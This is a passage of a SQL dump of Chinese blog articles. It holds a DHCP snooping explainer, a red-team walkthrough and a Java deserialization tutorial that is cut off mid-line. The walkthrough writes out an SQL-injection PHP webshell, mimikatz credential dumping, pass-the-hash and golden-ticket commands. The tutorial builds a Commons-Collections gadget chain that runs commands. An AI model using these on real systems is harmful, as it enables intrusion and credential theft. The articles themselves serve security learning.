请求报文的（报文头里的）源MAC地址和（报文内容里的）DHCP客户机的硬件地址（即CHADDR字段），这两者相同的请求才会被转发，否则将被丢弃。</p>\n<p>这样就防止了DHCP拒绝服务攻击。</p>\n<p>信任端口：可以接收所有的DHCP报文。通过只将交换机连接到合法DHCP服务器的端口设置为信任端口，其他端口设置为非信任端口，可防止用户伪造DHCP服务器来攻击网络。DHCP监听特性还可以对端口的DHCP报文进行限速。通过在每个非信任端口下进行限速，将可以阻止合法DHCP请求报文的广播攻击。</p>\n<p>DHCP Snooping Binding（DHCP监听表）<br />DHCP监听还有一个非常重要的作用就是建立一张DHCP监听绑定表（DHCP Snooping Binding）。</p>\n<p>一旦一个连接在非信任端口的客户端获得一个合法的DHCP Offer，交换机就会自动在DHCP监听绑定表里添加一个绑定条目，内容包括了该非信任端口的客户端IP地址、MAC地址、端口号、VLAN编号、租期等信息。</p>\n<p>为了保证设备在生成DHCP Snooping绑定表时能够获取到用户MAC等参数，DHCP Snooping功能需应用于二层网络中的接入设备或第一个DHCP Relay上。</p>\n<p>非信任端口只允许客户端的DHCP请求报文通过，这里只是相对于DHCP报文来说的。其他非DHCP报文还是可以正常转发的。</p>\n<p>这就表示客户端可以以静态指定IP地址的方式通过非信任端口接入网络。由于静态客户端不会发送DHCP报文，所以DHCP监听绑定表里也不会有该静态客户端的记录。</p>\n<p>信任端口的客户端信息不会被记录到DHCP监听绑定表里。</p>\n<p>如果有一客户端连接到了一个信任端口，即使它是通过正常的DHCP方式获得IP地址，DHCP监听绑定表里也不有该客户端的记录。</p>\n<p>如果要求客户端只能以动态获得IP的方式接入网络，则必须借助于IPSG和DAI技术。（DHCP监听绑定表中的条目可以手工添加，无论是对信任端口还是非信任端口而言）</p>\n<p>交换机为了获得高速转发，通常只检查报文的二层帧头，获得目标MAC地址后直接转发，不会去检查报文的内容。而DHCP监听本质上就是开启交换机对DHCP报文的内容部分的检查，DHCP报文不再只是被检查帧头了。</p>\n<p>当交换机收到一个DHCPDECLINE或DHCPRELEASE广播报文，并且报文头的源MAC地址存在于DHCP监听绑定表的一个条目中。但是报文的实际接收端口与绑定表条目中的端口字段不一致时，该报文将被丢弃。（防止DHCP仿冒者攻击）</p>\n<p>DHCP监听绑定表里的Lease列就是每个客户端对应的DHCP租约时间。</p>\n<p>当客户端离开网络后，该条目并不会立即消失。</p>\n<p>当客户端再次接入网络，重新发起DHCP请求以后，相应的条目内容就会被更新。</p>\n<p>DHCP Snooping绑定表根据DHCP租期进行老化或根据用户释放IP地址时发出的DHCP Release报文自动删除对应表项。</p>\n<p>DHCP监听绑定表在设备重启后会丢失，需要重新绑定，但可以通过设置将绑定表保存在flash或者tftp/ftp服务器上，待设备重启后直接读取，而不需要客户端再次进行绑定。</p>\n<p>DHCP监听绑定表不仅用于防御DHCP攻击，还为后续的IPSG和DAI技术提供动态数据库支持。</p>\n<p>DHCP Snooping支持的Option82功能：<br />概述：<br />在传统的DHCP动态分配IP地址过程中，DHCP Server不能够根据DHCP请求报文感知到用户的具体物理位置，以致同一VLAN的用户得到的IP地址所拥有的权限是完全相同的。</p>\n<p>由于网络管理者不能对同一VLAN中特定的用户进行有效的控制，即不能够控制客户端对网络资源的访问，这将给网络的安全控制提出了严峻的挑战。</p>\n<p>RFC 3046定义了DHCP Relay Agent Information Option（Option 82），该选项记录了DHCP Client的位置信息。DHCP Snooping设备或DHCP Relay通过在DHCP请求报文中添加Option 82选项，将DHCP Client的精确物理位置信息传递给DHCP Server，从而使得DHCP Server能够为主机分配合适的IP地址和其他配置信息，实现对客户端的安全控制。</p>\n<p>注意：<br />Option 82选项携带的用户位置信息与DHCP Snooping绑定表记录的用户参数是两个相互独立的概念，没有任何关联。Option 82选项携带的用户位置信息是在DHCP用户申请IP地址时（此时用户还未分配到IP地址），由设备添加到DHCP请求报文中。DHCP Snooping绑定表是在设备收到DHCP Server回应的DHCP Ack报文时（此时已为用户分配了IP地址），设备根据DHCP Ack报文信息自动生成。</p>\n<p>Option82两个常用子选项<br />Option82包含两个常用子选项Circuit ID和Remote ID</p>\n<p>Circuit ID子选项主要用来标识客户端所在的VLAN、接口等信息</p>\n<p>Remote ID子选项主要用来标识客户端接入的设备，一般为设备的MAC地址。</p>\n<p>设备作为DHCP Relay时，使能或未使能DHCP Snooping功能都可支持Option82选项功能，但若设备在二层网络作为接入设备，则必须使能DHCP Snooping功能方可支持Option82功能。</p>\n<p>Option 82选项仅记录了DHCP用户的精确物理位置信息并通过DHCP请求报文中将该信息发送给DHCP Server。而如果需要对不同的用户部署不同的地址分配或安全策略，则需DHCP Server支持Option 82功能并在其上已配置了IP地址分配或安全策略。</p>\n<p>实现方式：<br />Insert方式：当设备收到DHCP请求报文时，若该报文中没有Option 82选项，则插入Option82选项；若该报文中含有Option82选项，则判断Option82选项中是否包含remote-id，如果包含，则保持Option82选项不变，如果不包含，则插入remote id。</p>\n<p>Rebuild方式：当设备收到DHCP请求报文时，若该报文中没有Option82选项，则插入Option82选项；若该报文中含有Option82选项，则删除该Option82选项并插入管理员自己在设备上配置的Option82选项。</p>\n<p>对于Insert和Rebuild两种方式，当设备接收到DHCP服务器的响应报文时，处理方式一致。</p>\n<p>DHCP响应报文中有Option82选项情况：<br />1. 如果设备收到的DHCP请求报文中没有Option82选项</p>\n<p>则设备将删除DHCP响应报文中的Option82选项，之后转发给DHCP Client。</p>\n<p>2. 如果设备收到的DHCP请求报文中有Option82选项</p>\n<p>则设备将DHCP响应报文中的Option 82选项格式还原为DHCP请求报文中的Option82选项，之后转发给DHCP Client。</p>\n<p>DHCP响应报文不含有Option82选项：直接转发。</p>\n<p>写在最后<br />DHCP这一个部分相对式比较难的，有些不理解可以多看几遍，对照DHCP报文格式来看</p>\n<p>中间的一些字段值在上一篇文章都有写道，搞明白报文格式，字段值，那么就容易理解了。</p>\n<p>对于DHCP这一个部分，其实也不是很必要学的这么深，但就个人而言，比较喜欢学全面，哈哈哈哈哈。有哪个部分我没有写明白的，或者有不当之处，欢迎各位大佬指正。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「_PowerShell」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/qq_51577576/article/details/121705492</p>', '', 8, ',37,38,', '原创', '公开', '已发布', '', 988, '', '', 0, '2021-12-05 22:25:02', '2021-12-05 22:25:02');
INSERT INTO `article` VALUES (27, '红队攻防之从边界突破到漫游内网(无cs和msf)', 2, '概述', '<p>前言<br />网络安全的本质：懂进攻，知防守，先正向，后逆向。</p>\n<p>本篇文章目录</p>\n<p><br />网络拓扑图：<br />本次红队攻防实战所需绘制的拓扑图如下：</p>\n<p><br />边界突破<br />访问网站：</p>\n<p>http://xxx.xxx.xxx/?id=1<br />1<br />首页如下：</p>\n<p><br />SQL注入拿shell<br />构造payload：and 1=1显示正确，and 1=2显示错误，说明存在SQL注入，并且爆出绝对路径</p>\n<p>使用常用的注入函数into outfile 将一句话木马写入自动创建的 xxx.php文件中</p>\n<p>http://xxx.xxx.xxx/?id=1 and 1=2 union select 1,\'&lt;?php @eval($_REQUEST[xxx]);?&gt;\' into outfile \'x:\\\\xxx\\\\xxx\\\\xxx.php\'<br />1<br />需要有写入权限和上一步爆出的绝对路径</p>\n<p>验证上传的木马是否成功，成功写入木马</p>\n<p>http://xxx.xxx.xxx/xxx.php?xxx=phpinfo();<br />1</p>\n<p><br />成功利用蚁剑拿到shell</p>\n<p>&nbsp;</p>\n<p>&rarr;点击获取网络安全学习资料&middot;攻略&larr;</p>\n<p>2000多本网络安全系列电子书<br />网络安全标准题库资料<br />项目源码<br />网络安全基础入门、Linux、web安全、攻防方面的视频<br />网络安全学习路线图</p>\n<p>内网信息收集<br />whoami<br />发现是普通用户的权限</p>\n<p>ipconfig /all<br />查看用户的IP信息，可以看到位于工作组环境</p>\n<p>route print<br />查看路由，通往10.0.1网段</p>\n<p>net config Workstation<br />查看计算机名、全名、用户名、系统版本、工作站</p>\n<p>.利用蚁剑传入Potato提权工具,并使用其虚拟终端，查看权限，提权。<br />将超时时间调大：</p>\n<p>上传Potato提权工具成功，改名为xxx.exe</p>\n<p>使用命令可以看到成功提权<br />xxx.exe -p &ldquo;whoami&rdquo;</p>\n<p>将mimikatz改名为x.exe，成功上传</p>\n<p>然后在终端执行</p>\n<p>xxx.exe -p \"x.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords full\"\" exit &gt;&gt; log.txt\"<br />1</p>\n<p>查看log.txt，成功抓到当前用户和另一用户的密码</p>\n<p><br />和</p>\n<p>netstat -ano查看是否开启3389端口，发现已开启</p>\n<p>查看防火墙是开启的<br />netsh firewall show state</p>\n<p><br />reGeorg内网穿透<br />使用软件reGeorg实现攻击机与目标机器的通信<br />通过蚁剑将reGeorge中的tunnel.php上传至网站改名为tu.php</p>\n<p><br />并成功访问</p>\n<p>http://xx.xx.xx/tu.php<br />1</p>\n<p>启动reGeorg</p>\n<p>python3 xx.py -k xxx -u http://xx.xx.xx/tu.php<br />1<br />表示本地1080端口的流量都转发给指定的那个url，1080是指定的监听端口；</p>\n<p>代理可以使用：</p>\n<p><br />内网渗透<br />拿下边界服务器<br />挂上代理远程连接10.0.1.4</p>\n<p>创建新账号admin 并提权</p>\n<p>xx.exe -p \"net user xxx xxxx /add\" //新增账号和对应密码<br />xx.exe -p \"net localgroup administrators xxxx /add\"//提升新增账号的权限至administrators组<br />1<br />2</p>\n<p>远程连接</p>\n<p>成功连接</p>\n<p>将mimikatz添加到桌面并以管理员权限运行<br />privilege::debug 提升权限<br />log 日志会记录内容<br />sekurlsa::logonpasswords 抓取密码</p>\n<p>成功抓到管理员账户密码：<br />使用上述管理员账号密码，成功登陆服务器</p>\n<p>通过nbtscan对当前C端进行扫描，发现还有三台机器存活</p>\n<p><br />拿下域内主机<br />根据我这个渗透时长两年半的个人练习生的经验来判断，内网里的服务器的账号密码有部分可能是相同的。<br />再使用上述管理员账号密码远程连接10.0.1.8</p>\n<p><br />成功连接</p>\n<p>whoami查看是administrator权限<br />ipconfig /all查看有域xx.xx</p>\n<p>一般DNS服务器就是域控服务器</p>\n<p>查询域控主机名，遭拒绝，需利用官方工具将账号提升至system权限，再查<br />net user /domain</p>\n<p><br />上传官方工具PsExec.exe提权<br />PsExec.exe -i -s -d cmd 提升至system权限，获取主机名DC.xx.xx</p>\n<p>尝试访问域控主机C盘<br />dir \\DC.xx.xx\\c$</p>\n<p>是拒绝的，需要工具minikatz，使用哈希传递</p>\n<p>拿下域控<br />将mimikatz添加到桌面并以管理员权限运行<br />privilege::debug 提升权限<br />log 日志会记录内容<br />sekurlsa::logonpasswords 抓取密码</p>\n<p>获取</p>\n<p>user=administrator<br />Domain=xxx<br />NTLM=xxxxxxx<br />1<br />2<br />3<br />将上述值放入下方命令中，完成哈希传递，以后利用这个CMD窗口运行,拥有管理员权限。</p>\n<p>sekurlsa::pth /user:administrator /domain:\"xx.xx\"<br />/ntlm:xxxxxxx<br />1<br />2<br />启动域控主机cmd窗口，成功访问域控主机C盘<br />dir \\DC.xx.xx\\c$</p>\n<p>使用官方工具PsExec.exe，命令如下：<br />PsExec.exe \\dc.xx.xx cmd<br />进入c:<br />输入ipconfig， 10.0.1.6为域控ip，此时成功获取域控cmd</p>\n<p>新建账号，直接远程登陆域控主机</p>\n<p>\"net user xxx xxxx /add\" //新增账号和对应密码<br />\"net localgroup administrators xxxx /add\"//提升新增账号的权限至administrators组<br />1<br />2</p>\n<p>建好账号后，直接登陆域控主机10.0.1.6(DC.xx.xx)，成功拿下域控主机权限</p>\n<p>至此已成功拿下三台主机的权限。</p>\n<p><br />权限维持<br />可通过制作黄金票据进行权限维持<br />因为域控主机10.0.1.6安装了补丁KB2871997，所以无法抓取到明文密码<br />管理员运行猕猴桃<br />log 日志记录内容<br />lsadump::dcsync /user:krbtgt 获取内容</p>\n<p>获取krbtgt账号的关键值（OSID和Hash_NTLM）</p>\n<p>制作黄金票据</p>\n<p>kerberos::golden /admin:administrator /domain:xx.xx /sid:xx-xx-xx /krbtgt:xxxxxx /ticket:xxx.kiribi<br />1<br />如图</p>\n<p>票据加载成功</p>\n<p>普通窗口无法访问域控根目录</p>\n<p>把域控中的票据复制到在10.0.1.8主机中，使用猕猴桃加载票据<br />kerberos::ptt xxx.kiribi 加载票据</p>\n<p>然后成功在普通cmd中访问域控c盘内容<br />dir \\DC.xx.xx\\c$</p>\n<p>PExec.exe \\DC.xx.xx cmd 获取域控cmd</p>\n<p><br />结语<br />一名优秀的白帽子，是不能有短板的，有的只能是几块长板和很多的标准板。<br />&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;<br />版权声明：本文为CSDN博主「IT老涵」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br />原文链接：https://blog.csdn.net/HBohan/article/details/121697131</p>', '', 9, ',37,38,', '原创', '公开', '已发布', '', 554, '', '', 0, '2021-12-05 22:30:43', '2021-12-05 22:30:43');
INSERT INTO `article` VALUES (28, '从零开始的JAVA反序列化漏洞学习（一）', 1, '概述', '<p>前言：<br />大概是决定复现JAVA的CVE，第一个拿cve-2016-4437试试，但是之前没接触过JAVA，在历经磨难安装好IDEA maven和依赖环境，跟着各位师傅的教程调试源代码发现大佬们的教程都是跟到 可以控制传入readObject()的反序列化就没了，再细查便是什么CC4，CC3.1之类看上去很深奥的东西。深感基础不足，从头开始学JAVA的各种机制，如有错误疏漏不足欢迎在评论中指出。</p>\n<p>利用Java反射执行代码<br />Java的反序列化是离不开Java的反射机制的，反射机制离不开Object类和Class类，关于反射已经有很多大佬写过详解，这里只用两个例子来说明如何利用Java反射来执行代码<br />第一个，经典弹计算器</p>\n<p>public class Hello {<br />public static void main(String[] args) throws Exception {<br />Hello helloTest = new Hello();<br />helloTest.oneTest();<br />}<br />public void oneTest() throws Exception{<br />Object runtime=Class.forName(\"java.lang.Runtime\")<br />.getMethod(\"getRuntime\",new Class[]{})<br />.invoke(null);</p>\n<p>Class.forName(\"java.lang.Runtime\")<br />.getMethod(\"exec\", String.class)<br />.invoke(runtime,\"calc.exe\");<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />首先是几个关键的方法：<br />Class.forName()方法：<br />Class.forName是一个静态方法，可以用来加载类。该方法有两种形式：Class.forName(String name, boolean initialize, ClassLoader loader)和 Class.forName(String className)，参数String className为所需的类名，方法返回一个与给定的字符串名称相关联类或接口的Class对象。</p>\n<p>getMethod()方法与invoke方法：一般同时使用<br />Method getMethod(String name,Class...parameterTypes)，参数String name表示mothod的名称，Class parameterTypes表示method的参数类型的列表（参数顺序需按声明method时的参数列表排列），符合method名称和参数的method对象<br />Object invoke(Object obj,Object...args)，调用包装在当前Method对象中的方法，参数Object obj表示实例化后的对象，Object args表示方法调用的参数</p>\n<p>再来分析例子中的第一部分代码：</p>\n<p>Object runtime=Class.forName(\"java.lang.Runtime\")<br />.getMethod(\"getRuntime\",new Class[]{})<br />.invoke(null);<br />1<br />2<br />3<br />相当于调用了 Runtime类中的getRuntime方法并赋值给runtime，我们查看一下getRuntime方法的代码：</p>\n<p>public class Runtime {<br />private static Runtime currentRuntime = new Runtime();<br />public static Runtime getRuntime() {<br />return currentRuntime;<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />因为是static方法，不依附于任何对象，所以在用.invoke()调用时可以没有 参数Object obj，返回的一个new Runtime对象。</p>\n<p>再看第二部分</p>\n<p>Class.forName(\"java.lang.Runtime\")<br />.getMethod(\"exec\", String.class)<br />.invoke(runtime,\"calc.exe\");<br />1<br />2<br />3<br />相当于调用了 runtime.exec(&ldquo;calc.exe&rdquo;)，因为exec()方法不是static，所以invoke()方法需要一个Object obj参数，也就是第一部分返回的runtime。（PS. 个人觉得Java的反射机制有点模糊了 数据和程序 的边界，可以通过用户输入的字符串来调用没有预期的函数执行恶意命令。）</p>\n<p>Transformer常见的恶意代码包装类<br />利用Transformer，我们可以构造一条可序列化的恶意的代码链</p>\n<p>import org.apache.commons.collections.Transformer;<br />import org.apache.commons.collections.functors.ChainedTransformer;<br />import org.apache.commons.collections.functors.ConstantTransformer;<br />import org.apache.commons.collections.functors.InvokerTransformer;</p>\n<p>import java.io.ByteArrayOutputStream;<br />import java.io.IOException;<br />import java.io.ObjectOutputStream;</p>\n<p>public class Hello {<br />public static void main(String[] args) throws Exception {<br />TransformerTest test = new TransformerTest();<br />test.runTest();<br />}<br />}</p>\n<p>class TransformerTest {<br />public void runTest(){<br />Transformer[] transformers = new Transformer[]{<br />new ConstantTransformer(Runtime.class),<br />new InvokerTransformer(\"getMethod\", new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\", new Class[0]}),<br />new InvokerTransformer(\"invoke\", new Class[]{Object.class,Object[].class},new Object[]{null, new Object[0]}),<br />new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\",}),<br />};<br />//ChainedTransformer transformerChain也可以是Transformer transformerChain<br />ChainedTransformer transformerChain = new ChainedTransformer(transformers);<br />//引爆点<br />transformerChain.transform(null);</p>\n<p>try {<br />//serialize test<br />ByteArrayOutputStream out = new ByteArrayOutputStream();<br />ObjectOutputStream objOut = new ObjectOutputStream(out);<br />objOut.writeObject(transformerChain);<br />} catch (IOException e) {<br />e.printStackTrace();<br />}<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />先是一个transformer数组里面添加了ConstantTransformer与InvokerTransformer，之后用该数组为参数构造一个ChainedTransformer transformerChain对象（这里也可以是Transformer transformerChain对象，ChainedTransformer类implements了Transformer），调用它的transform()方法<br />下断点调试下，可以看到ChainedTransformer的构造方法和transform()方法的代码为</p>\n<p>public ChainedTransformer(Transformer[] transformers) {<br />this.iTransformers = transformers;<br />}<br /><br />public Object transform(Object object) {<br />for(int i = 0; i &lt; this.iTransformers.length; ++i) {<br />object = this.iTransformers[i].transform(object);<br />}<br />return object;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />也就是transform()会依次调用transformer数组中transformer的transform()方法<br />继续调试，第一个是ConstantTransformer的transform()</p>\n<p>public ConstantTransformer(Object constantToReturn) {<br />this.iConstant = constantToReturn;<br />}<br />//iConstant = class java.lang.Runtime<br />public Object transform(Object input) {<br />return this.iConstant;<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />返回了class java.lang.Runtime，再进入InvokerTransformer的transform()</p>\n<p>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {<br />this.iMethodName = methodName;<br />this.iParamTypes = paramTypes;<br />this.iArgs = args;<br />}<br /><br />public Object transform(Object input) {<br />//input：class java.lang.Runtime<br />if (input == null) {<br />return null;<br />} else {<br />try {<br />//iMethodName：getMethod<br />//iParamTypes：Class[]{String.class,Class[].class}<br />//iArgs：Object[]{\"getRuntime\", new Class[0]}<br />Class cls = input.getClass();<br />//调用getMethod来获取getMethod<br />Method method = cls.getMethod(this.iMethodName, this.iParamTypes);<br />//调用invoke来执行getMethod来获取getRuntime方法<br />return method.invoke(input, this.iArgs);<br />} catch (NoSuchMethodException var5) {<br />throw new FunctorException(\"InvokerTransformer: The method \'\" + this.iMethodName + \"\' on \'\" + input.getClass() + \"\' does not exist\");<br />} catch (IllegalAccessException var6) {<br />throw new FunctorException(\"InvokerTransformer: The method \'\" + this.iMethodName + \"\' on \'\" + input.getClass() + \"\' cannot be accessed\");<br />} catch (InvocationTargetException var7) {<br />throw new FunctorException(\"InvokerTransformer: The method \'\" + this.iMethodName + \"\' on \'\" + input.getClass() + \"\' threw an exception\", var7);<br />}<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />用上面的反射基础知识可以知道，调用了Runtime的getMethod()方法（用一个与Runtime相关联的class对象来调用的），来查找getRuntime()方法，返回一个public static java.lang.Runtime java.lang.Runtime.getRuntime()，（挺绕的，用getMethod来获取getMethod，再用invoke来执行getMethod来获取getRuntime）<br />也就是InvokerTransformer类的transform()方法将会以InvokerTransformer(方法名称, 参数类型,方法参数)的形式调用方法，而方法所在的类或对象则是由链条上一步来返回的。</p>\n<p>同理下面将执行invoke()来获取Runtime对象，然后执行exec(&ldquo;calc.exe&rdquo;)，整体相当于</p>\n<p>public static void main(String[] args) throws IOException {<br />Runtime.getRuntime().exec(\"calc.exe\");<br />}<br />1<br />2<br />3<br />我们得到了一条可以执行恶意代码可以被序列化的ChainedTransformer transformerChain，但是我们如何能够让它能够在正常代码中执行它的transformerChain.transform(null) 方法来执行呢？</p>\n<p>重写后的readObject如何被执行<br />（这是我个人不整明白不舒服的疑问，只粗略写了调试过程，不感兴趣的话可以略过）<br />首先我们要了解为什么在重写readObject()方法后，在反序列化时会调用重写后的方法而不是原方法，来看一个例子</p>\n<p>import java.io.*;</p>\n<p>public class Test {<br />public static void main(String[] args) throws Exception {<br />SerializeTest serializeTest = new SerializeTest();</p>\n<p>try {<br />ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"temp\"));<br />oos.writeObject(serializeTest);<br />oos.close();<br />} catch (IOException e) {<br />e.printStackTrace();<br />}<br /><br />try {<br />ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"temp\"));<br />Object p = ois.readObject();<br />// p.show();<br />} catch (IOException e) {<br />e.printStackTrace();<br />} catch (ClassNotFoundException e) {<br />e.printStackTrace();<br />}<br />}</p>\n<p>}</p>\n<p>class SerializeTest implements Serializable {<br />String str = \"hello\";</p>\n<p>public void show(){<br />System.out.println(str);<br />}</p>\n<p>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException{<br />System.out.println(\"readObject run\");<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />在Object p = ois.readObject();可以看见，它被反序列化为了Object对象而不是SerializeTest的，为什么它可以找到重写后的readObject呢？</p>\n<p>下断点然后可以看到调用栈</p>\n<p>首先通过下图的调用来读取序列化串来获取类名<br />接下来是如何调用重写后的readObject()，先是调用ObjectInputStream的readObject()方法</p>\n<p><br />之后进入readObject0()，在方法内调用readSerialData(obj, desc);然后跟入 slotDesc.invokeReadObject(obj, this);-&gt; readObjectMethod.invoke(obj, new Object[]{ in });</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>到达invoke()后就是我们上面提到的用反射来调用方法，执行了我们重写的readObject()方法</p>\n<p>重写readObject方法导致的疏漏<br />例如在Java的代码中存在一个对象BadAttributeValueExpException，它重写了它的readObject()</p>\n<p>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {<br />ObjectInputStream.GetField gf = ois.readFields();<br />Object valObj = gf.get(\"val\", null);</p>\n<p>if (valObj == null) {<br />val = null;<br />} else if (valObj instanceof String) {<br />val= valObj;<br />} else if (System.getSecurityManager() == null<br />|| valObj instanceof Long<br />|| valObj instanceof Integer<br />|| valObj instanceof Float<br />|| valObj instanceof Double<br />|| valObj instanceof Byte<br />|| valObj instanceof Short<br />|| valObj instanceof Boolean) {<br />val = valObj.toString();<br />} else { // the serialized object is from a version without JDK-8019292 fix<br />val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName();<br />}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />可以看到存在一个toString()方法，我们还要找到一条链可以从toString()调用到transformerChain.transform(null)</p>\n<p>我们将采用Commons-collections 3.1提供的类LazyMap与TiedMapEntry<br />首先是LazyMap：存在LazyMap.decorate()，正常用法如下：</p>\n<p>Map names = new HashMap();<br />Map lazyNames = LazyMap.decorate(names, transformer);<br />//将Map和transformer传递给lazymap<br />String name = (String) lazyNames.get(\"someName\");<br />//调用LazyMap里面的get()方法，但当没有这个key时会调用transform方法得到value,返回get<br />System.out.println(\"name: \"+name);<br />1<br />2<br />3<br />4<br />5<br />6<br />当我们尝试获取一个不存在的键值时，它会运行在LazyMap.decorate(names, transformer);中传入的transformer（有种PHP中的魔法方法的感觉），添加到我们的代码中测试一下</p>\n<p>import org.apache.commons.collections.Transformer;<br />import org.apache.commons.collections.functors.ChainedTransformer;<br />import org.apache.commons.collections.functors.ConstantTransformer;<br />import org.apache.commons.collections.functors.InvokerTransformer;<br />import org.apache.commons.collections.map.LazyMap;</p>\n<p>import java.util.HashMap;<br />import java.util.Map;</p>\n<p>public class Hello {<br />public static void main(String[] args) throws Exception {<br />TransformerTest test = new TransformerTest();<br />test.runTest();<br />}</p>\n<p>}</p>\n<p><br />class TransformerTest {<br />public void runTest() {<br />Transformer[] transformers = new Transformer[]{<br />new ConstantTransformer(Runtime.class),<br />new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}),<br />new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),<br />new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\",}),<br />};<br />Transformer transformerChain = new ChainedTransformer(transformers);</p>\n<p>// transformerChain.transform(null);<br />Map targetMap = LazyMap.decorate(new HashMap(), transformerChain);<br />System.out.println(targetMap.get(\"anything\"));<br />}<br />}</p>\n<p><br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />成功调用计算器</p>\n<p>现在我们的目标便是从toString()调用到Map对象的get方法，需要使用TiedMapEntry再次包装<br />TiedMapEntry：该类主要的作用是将一个Map 绑定到 Map.Entry 下,形成一个映射</p>\n<p>public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {<br />private final Map map;<br />private final Object key;</p>\n<p>public TiedMapEntry(Map map, Object key) {<br />super();<br />this.map = map;<br />this.key = key;<br />}<br />public Object getValue() {<br />return map.get(key);<br />}<br />public String toString() {<br />return getKey() + \"=\" + getValue();<br />}<br />}</p>\n<p>1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />可以看到其中的getValue()实际上调用的便是map.get(key)，所以我们可以构造如下代码：</p>\n<p>import org.apache.commons.collections.Transformer;<br />import org.apache.commons.collections.functors.ChainedTransformer;<br />import org.apache.commons.collections.functors.ConstantTransformer;<br />import org.apache.commons.collections.functors.InvokerTransformer;<br />import org.apache.commons.collections.keyvalue.TiedMapEntry;<br />import org.apache.commons.collections.map.LazyMap;</p>\n<p>import javax.management.BadAttributeValueExpException;<br />import java.util.HashMap;<br />import java.util.Map;</p>\n<p>public class Hello {<br />public static void main(String[] args) throws Exception {<br />TransformerTest test = new TransformerTest();<br />test.runTest();<br />}</p>\n<p>}</p>\n<p><br />class TransformerTest {<br />public void runTest() {<br />Transformer[] transformers = new Transformer[]{<br />new ConstantTransformer(Runtime.class),<br />new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}),<br />new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),<br />new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\",}),<br />};<br />Transformer transformerChain = new ChainedTransformer(transformers);</p>\n<p>// transformerChain.transform(null);<br />Map targetMap = LazyMap.decorate(new HashMap(), transformerChain);<br />// System.out.println(targetMap.get(\"anything\"));</p>\n<p>TiedMapEntry entry = new TiedMapEntry(targetMap, \"hack\");<br />entry.toString();</p>\n<p>}<br />}<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />10<br />11<br />12<br />13<br />14<br />15<br />16<br />17<br />18<br />19<br />20<br />21<br />22<br />23<br />24<br />25<br />26<br />27<br />28<br />29<br />30<br />31<br />32<br />33<br />34<br />35<br />36<br />37<br />38<br />39<br />成功调用<br />我们来构造整个调用链</p>\n<p>public Object getObject() {<br />Transformer[] transformers = new Transformer[]{<br />new ConstantTransformer(Runtime.class),<br />new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}),<br />new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),<br />new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\",}),<br />};<br />Transformer transformerChain = new ChainedTransformer(transformers);</p>\n<p>// transformerChain.transform(null);<br />Map targetMap = LazyMap.decorate(new HashMap(), transformerChain);<br />// System.out.println(targetMap.get(\"anything\"));</p>\n<p>TiedMapEntry entry = new TiedMapEntry(targetMap, \"hack\");<br />// entry.toString();</p>\n<p>// BadAttributeValueExpException val = new 